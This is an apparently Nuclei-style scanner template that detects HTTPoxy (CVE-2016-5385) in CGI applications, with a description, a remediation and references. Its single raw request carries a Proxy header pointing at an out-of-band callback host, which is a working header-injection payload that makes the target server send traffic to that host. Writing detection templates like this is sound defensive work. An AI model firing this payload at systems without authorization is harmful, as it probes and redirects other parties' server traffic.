id: CVE-2016-5385

info:
  name: HTTPoxy - Proxy Header to HTTP_PROXY Env Injection
  author: oxqnd
  severity: high
  description: |
    HTTPoxy is a vulnerability affecting CGI-based applications using environment variables. 
    When a Proxy header is supplied, it can be translated to the HTTP_PROXY environment variable,
    which is used by various libraries (e.g. Guzzle, curl, requests), allowing attackers to redirect 
    outbound traffic to a server they control.
  impact: |
    Attackers can manipulate server-side HTTP client behavior to leak data or redirect traffic
    through malicious proxies.
  remediation: |
    Unset the HTTP_PROXY environment variable before request handling or block the Proxy header at the web server.
  reference:
    - https://httpoxy.org/
    - https://nvd.nist.gov/vuln/detail/CVE-2016-5385
    - https://bugzilla.redhat.com/show_bug.cgi?id=1353794
    - https://github.com/guzzle/guzzle/releases/tag/6.2.1
  classification:
    cve-id: CVE-2016-5385
    cwe-id: CWE-601
    cvss-score: 8.1
  tags: cve,cve2016,httpoxy,env,guzzle,proxy,php,fastcgi,header-injection

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        Proxy: http://{{interactsh-url}}

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - http

      - type: status
        status:
          - 200
